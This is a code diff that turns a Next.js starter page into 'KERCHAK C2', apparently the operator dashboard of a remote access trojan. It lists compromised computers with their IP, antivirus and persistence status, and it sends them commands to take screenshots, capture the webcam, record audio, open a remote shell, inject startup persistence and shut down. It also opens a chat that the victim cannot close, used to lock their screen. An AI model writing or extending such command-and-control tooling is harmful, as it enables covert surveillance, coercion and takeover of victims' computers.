@@ -1,65 +1,173 @@
-import Image from "next/image";
+"use client";
 
-export default function Home() {
+import { useEffect, useState } from 'react';
+import { supabase } from '@/lib/supabase';
+import { Monitor, Power, RefreshCw, ShieldAlert, Terminal, Camera, Mic, MessageSquare, Shield, Activity, X } from 'lucide-react';
+
+interface Computer {
+  id: string;
+  pc_name: string;
+  public_ip: string;
+  status: 'online' | 'offline';
+  startup_enabled: boolean;
+  antivirus: string;
+  last_seen: string;
+}
+
+export default function Dashboard() {
+  const [computers, setComputers] = useState<Computer[]>([]);
+  const [activeModal, setActiveModal] = useState<'chat' | 'screenshot' | null>(null);
+  const [selectedPc, setSelectedPc] = useState<string | null>(null);
+  const [screenshots, setScreenshots] = useState<string[]>([]);
+  const [chatMessages, setChatMessages] = useState<{from: string, text: string}[]>([]);
+  const [chatInput, setChatInput] = useState("");
+
+  useEffect(() => {
+    const fetchComputers = async () => {
+      let { data } = await supabase.from('computers').select('*');
+      setComputers(data || []);
+    }
+    fetchComputers();
+
+    const sub = supabase.channel('public:computers')
+      .on('postgres_changes', { event: '*', schema: 'public', table: 'computers' }, (payload) => {
+        setComputers((current) => {
+          const newPc = payload.new as Computer;
+          const index = current.findIndex(c => c.id === newPc.id);
+          if (index > -1) {
+            const updated = [...current];
+            updated[index] = newPc;
+            return updated;
+          }
+          return [...current, newPc];
+        });
+      }).subscribe();
+
+    return () => { supabase.removeChannel(sub); };
+  }, []);
+
+  const sendCommand = async (pcId: string, cmd: string, args: any = {}) => {
+    await supabase.from('commands').insert({ computer_id: pcId, command: cmd, args, status: 'pending' });
+    
+    if (cmd === 'ss' || cmd === 'webcam') {
+      setSelectedPc(pcId);
+      setActiveModal('screenshot');
+    } else if (cmd === 'chat_open') {
+      setSelectedPc(pcId);
+      setActiveModal('chat');
+    }
+  };
+
+  const sendChatMessage = async () => {
+    if (!chatInput.trim() || !selectedPc) return;
+    setChatMessages([...chatMessages, {from: 'me', text: chatInput}]);
+    await supabase.from('chat_messages').insert({ computer_id: selectedPc, sender: 'admin', message: chatInput, is_read: false });
+    setChatInput("");
+  };
+
   return (
-    <div className="flex flex-col flex-1 items-center justify-center bg-zinc-50 font-sans dark:bg-black">
-      <main className="flex flex-1 w-full max-w-3xl flex-col items-center justify-between py-32 px-16 bg-white dark:bg-black sm:items-start">
-        <Image
-          className="dark:invert"
-          src="/next.svg"
-          alt="Next.js logo"
-          width={100}
-          height={20}
-          priority
-        />
-        <div className="flex flex-col items-center gap-6 text-center sm:items-start sm:text-left">
-          <h1 className="max-w-xs text-3xl font-semibold leading-10 tracking-tight text-black dark:text-zinc-50">
-            To get started, edit the page.tsx file.
-          </h1>
-          <p className="max-w-md text-lg leading-8 text-zinc-600 dark:text-zinc-400">
-            Looking for a starting point or more instructions? Head over to{" "}
-            <a
-              href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-              className="font-medium text-zinc-950 dark:text-zinc-50"
-            >
-              Templates
-            </a>{" "}
-            or the{" "}
-            <a
-              href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-              className="font-medium text-zinc-950 dark:text-zinc-50"
-            >
-              Learning
-            </a>{" "}
-            center.
-          </p>
+    <div className="min-h-screen bg-[#050505] text-gray-200 p-6 font-sans selection:bg-red-500/30">
+      <header className="flex justify-between items-center mb-10 border-b border-white/10 pb-6">
+        <div className="flex items-center gap-4">
+          <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-red-600 to-red-900 flex items-center justify-center shadow-[0_0_20px_rgba(220,38,38,0.4)]">
+            <Activity className="text-white" size={24} />
+          </div>
+          <div>
+            <h1 className="text-2xl font-bold tracking-wider text-white">KERCHAK <span className="text-red-500">C2</span></h1>
+            <p className="text-xs text-gray-500 uppercase tracking-widest">Advanced Command & Control</p>
+          </div>
         </div>
-        <div className="flex flex-col gap-4 text-base font-medium sm:flex-row">
-          <a
-            className="flex h-12 w-full items-center justify-center gap-2 rounded-full bg-foreground px-5 text-background transition-colors hover:bg-[#383838] dark:hover:bg-[#ccc] md:w-[158px]"
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <Image
-              className="dark:invert"
-              src="/vercel.svg"
-              alt="Vercel logomark"
-              width={16}
-              height={16}
-            />
-            Deploy Now
-          </a>
-          <a
-            className="flex h-12 w-full items-center justify-center rounded-full border border-solid border-black/[.08] px-5 transition-colors hover:border-transparent hover:bg-black/[.04] dark:border-white/[.145] dark:hover:bg-[#1a1a1a] md:w-[158px]"
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            Documentation
-          </a>
+        <div className="flex items-center gap-3 bg-white/5 border border-white/10 px-4 py-2 rounded-lg backdrop-blur-md">
+          <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse"></div>
+          <span className="text-sm font-medium">{computers.filter(c => c.status === 'online').length} Online</span>
         </div>
-      </main>
+      </header>
+
+      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+        {computers.map(pc => (
+          <div key={pc.id} className="relative group bg-[#0a0a0c] border border-white/10 rounded-2xl overflow-hidden hover:border-red-500/50 transition-all duration-300 shadow-xl">
+            <div className={`absolute top-0 left-0 w-full h-1 ${pc.status === 'online' ? 'bg-green-500 shadow-[0_0_15px_#22c55e]' : 'bg-gray-600'}`}></div>
+            <div className="p-5">
+              <div className="flex justify-between items-start mb-4">
+                <div>
+                  <h3 className="text-xl font-bold text-white group-hover:text-red-400 transition-colors flex items-center gap-2">
+                    <Monitor size={18} /> {pc.pc_name}
+                  </h3>
+                  <p className="text-xs text-gray-400 mt-1">{pc.public_ip}</p>
+                </div>
+                <div className={`px-2 py-1 rounded text-xs font-bold ${pc.status === 'online' ? 'bg-green-500/10 text-green-400 border border-green-500/20' : 'bg-gray-500/10 text-gray-400 border border-gray-500/20'}`}>
+                  {pc.status.toUpperCase()}
+                </div>
+              </div>
+              <div className="grid grid-cols-2 gap-4 mb-6 text-sm">
+                <div className="bg-white/5 p-3 rounded-lg border border-white/5">
+                  <span className="text-gray-500 text-xs block mb-1 flex items-center gap-1"><ShieldAlert size={12}/> Antivirus</span>
+                  <span className={pc.antivirus.includes('Defender') ? 'text-gray-200' : 'text-red-400 font-medium'}>{pc.antivirus || 'None'}</span>
+                </div>
+                <div className="bg-white/5 p-3 rounded-lg border border-white/5">
+                  <span className="text-gray-500 text-xs block mb-1 flex items-center gap-1"><Shield size={12}/> Startup</span>
+                  <span className={pc.startup_enabled ? 'text-green-400 font-medium' : 'text-gray-400'}>{pc.startup_enabled ? 'Injected' : 'None'}</span>
+                </div>
+              </div>
+              <div className="grid grid-cols-4 gap-2">
+                <button onClick={() => sendCommand(pc.id, 'ss')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-blue-400 transition-colors" title="Screenshot"><Camera size={18}/></button>
+                <button onClick={() => sendCommand(pc.id, 'webcam')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-purple-400 transition-colors" title="Webcam"><Monitor size={18}/></button>
+                <button onClick={() => sendCommand(pc.id, 'audio')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-yellow-400 transition-colors" title="Record Audio"><Mic size={18}/></button>
+                <button onClick={() => sendCommand(pc.id, 'chat_open')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-pink-400 transition-colors" title="Chat Box"><MessageSquare size={18}/></button>
+                
+                <button onClick={() => sendCommand(pc.id, 'cmd')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-gray-300 transition-colors" title="Remote Shell"><Terminal size={18}/></button>
+                <button onClick={() => sendCommand(pc.id, 'startup')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-green-400 transition-colors" title="Inject Startup"><Shield size={18}/></button>
+                <button onClick={() => sendCommand(pc.id, 'restart')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-orange-400 transition-colors" title="Restart PC"><RefreshCw size={18}/></button>
+                <button onClick={() => sendCommand(pc.id, 'shutdown')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-red-500 transition-colors" title="Shutdown PC"><Power size={18}/></button>
+              </div>
+            </div>
+          </div>
+        ))}
+      </div>
+
+      {activeModal === 'screenshot' && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
+          <div className="bg-[#111] border border-white/10 rounded-xl overflow-hidden w-full max-w-5xl shadow-2xl">
+            <div className="flex justify-between items-center p-4 border-b border-white/10 bg-black/50">
+              <h3 className="font-bold flex items-center gap-2"><Camera size={18}/> Captures</h3>
+              <button onClick={() => setActiveModal(null)} className="text-gray-400 hover:text-white"><X size={20}/></button>
+            </div>
+            <div className="p-4 flex gap-4 overflow-x-auto min-h-[300px] items-center justify-center">
+                <span className="text-gray-500 animate-pulse">Waiting for agent to upload image...</span>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {activeModal === 'chat' && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
+          <div className="bg-[#111] border border-white/10 rounded-xl overflow-hidden w-full max-w-lg shadow-2xl flex flex-col h-[500px]">
+            <div className="flex justify-between items-center p-4 border-b border-white/10 bg-black/50">
+              <h3 className="font-bold flex items-center gap-2 text-pink-400"><MessageSquare size={18}/> Live Chat (Unclosable on Client)</h3>
+              <div className="flex gap-2">
+                <button onClick={() => { sendCommand(selectedPc!, 'chat_close'); setActiveModal(null); }} className="text-xs bg-red-500/20 text-red-400 px-3 py-1 rounded hover:bg-red-500/30">Force Close Client</button>
+                <button onClick={() => setActiveModal(null)} className="text-gray-400 hover:text-white"><X size={20}/></button>
+              </div>
+            </div>
+            <div className="flex-1 p-4 overflow-y-auto flex flex-col gap-3">
+              {chatMessages.map((msg, i) => (
+                <div key={i} className={`p-3 rounded-lg max-w-[80%] ${msg.from === 'me' ? 'bg-red-600/20 text-red-200 self-end rounded-tr-none' : 'bg-white/10 text-gray-200 self-start rounded-tl-none'}`}>
+                  {msg.text}
+                </div>
+              ))}
+            </div>
+            <div className="p-4 border-t border-white/10 flex gap-2">
+              <input 
+                type="text" value={chatInput} onChange={e => setChatInput(e.target.value)}
+                onKeyDown={e => { if (e.key === 'Enter') sendChatMessage() }}
+                className="flex-1 bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-sm focus:outline-none focus:border-red-500" 
+                placeholder="Type a message to lock their screen with..." 
+              />
+              <button onClick={sendChatMessage} className="bg-red-600 hover:bg-red-500 text-white px-4 py-2 rounded-lg font-bold text-sm">Send</button>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
